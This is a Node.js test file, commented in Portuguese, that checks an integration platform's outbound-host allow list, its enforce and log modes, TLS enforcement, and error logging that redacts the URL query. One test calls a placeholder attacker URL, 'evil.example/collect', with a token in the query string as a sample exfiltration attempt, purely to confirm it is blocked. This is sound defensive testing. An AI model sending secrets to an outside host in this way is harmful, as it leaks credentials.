'use strict';

// M9-D244 — saída bloqueada pelo cliente do adapter resolvido pelo registro: erro HIGH na empresa, sem URL com query; modo log e hosts da conexão.
const { test, before, after, afterEach } = require('node:test');
const assert = require('node:assert/strict');
const { sequelize, comTenant, carregarTenants, ctxDe, conexao, config } = require('../../integrations/dispatch/dispatchHelpers');
const { registerBuiltInAdapters } = require('../../../src/features/integrations/adapters');
const adapterRegistry = require('../../../src/features/integrations/registry/adapterRegistry');
const { egressHostsOf } = require('../../../src/features/integrations/registry/adapterCtx');
const { IntegrationConnection } = require('../../../src/models');

let tenant;
let con;
const fetchOriginal = global.fetch;
before(async () => { ({ tenant } = await carregarTenants()); con = await conexao(tenant, 'MESSAGING'); registerBuiltInAdapters(); });
after(async () => { global.fetch = fetchOriginal; await sequelize.close(); });
afterEach(() => { global.fetch = fetchOriginal; });

const erros = (codigo) => comTenant(tenant, async (t) => (await sequelize.query(
  'SELECT severity, source, error_class, error_code, http_status, sanitized_payload, message FROM integration.integration_errors WHERE connection_id = :c AND error_code = :e ORDER BY created_at',
  { replacements: { c: con.id, e: codigo }, transaction: t }))[0]);

/** Resolve o adapter da conexão no tenant e tenta a chamada; devolve o erro lançado ou a resposta. */
function chamar(url, hostsDaChamada) {
  return comTenant(tenant, async (t) => {
    const adapter = await adapterRegistry.resolve(await IntegrationConnection.findByPk(con.id, { transaction: t }), ctxDe(tenant), t);
    try { return { ok: await adapter.ctx.http.fetch(url, {}, { allowedHosts: hostsDaChamada }), mode: adapter.ctx.http.egressMode }; } catch (err) { return { err, mode: adapter.ctx.http.egressMode }; }
  });
}

test('egress_bloqueio_vira_erro_de_integracao_HIGH_da_empresa_sem_a_url_completa', async () => {
  await config(tenant, 'integration.egress.mode', 'enforce');
  let rede = 0;
  global.fetch = async () => { rede += 1; return new Response('{}'); };
  const r = await chamar('https://evil.example/collect?token=segredo-abc');
  assert.equal(r.mode, 'enforce');
  assert.equal(r.err.statusCode, 502); assert.equal(r.err.code, 'INTEGRATION_EGRESS_BLOCKED');
  assert.equal(rede, 0);
  const [e] = await erros('INTEGRATION_EGRESS_BLOCKED');
  assert.deepEqual([e.severity, e.source, e.error_class, e.http_status], ['HIGH', 'CONTRACT', 'SECURITY', 502]);
  assert.equal(e.sanitized_payload.host, 'evil.example');
  assert.ok(!JSON.stringify(e).includes('token') && !JSON.stringify(e).includes('segredo-abc'), 'guarda só o host, nunca a query');

  const tls = await chamar('http://api.exemplo.com.br/x');
  assert.equal(tls.err.code, 'INTEGRATION_TLS_REQUIRED');
  assert.equal((await erros('INTEGRATION_TLS_REQUIRED'))[0].severity, 'HIGH');
});

test('egress_modo_vem_do_parametro_da_empresa_e_do_ambiente_da_conexao', async () => {
  global.fetch = async () => new Response('{}', { status: 200 });
  await config(tenant, 'integration.egress.mode', 'log');
  const antes = (await erros('INTEGRATION_EGRESS_BLOCKED')).length;
  const log = await chamar('https://evil.example/collect');
  assert.equal(log.mode, 'log');
  assert.equal(log.ok.status, 200, 'em modo log a chamada segue');
  assert.equal((await erros('INTEGRATION_EGRESS_BLOCKED')).length, antes, 'modo log não grava erro de integração');
});

test('egress_hosts_da_conexao_e_do_adapter_somam_e_a_url_de_terceiro_nunca_amplia', async () => {
  assert.deepEqual(egressHostsOf({ policyJson: { egressHosts: ['a.example'] } }, ['b.example', 'a.example']).sort(), ['a.example', 'b.example']);
  assert.deepEqual(egressHostsOf({ policyJson: {} }, undefined), []);
  await config(tenant, 'integration.egress.mode', 'enforce');
  global.fetch = async () => new Response('{}', { status: 200 });
  await comTenant(tenant, (t) => IntegrationConnection.update({ policyJson: { egressHosts: ['api.liberado.example'] } }, { where: { id: con.id }, transaction: t }));
  const liberado = await chamar('https://api.liberado.example/v1');
  assert.equal(liberado.ok.status, 200, 'host da policy da conexão passa');
  const terceiro = await chamar('https://cdn.terceiro.example/foto.jpg');
  assert.equal(terceiro.err.code, 'INTEGRATION_EGRESS_BLOCKED', 'host que veio de fora não entra na lista');
  await config(tenant, 'integration.egress.mode', 'log');
});
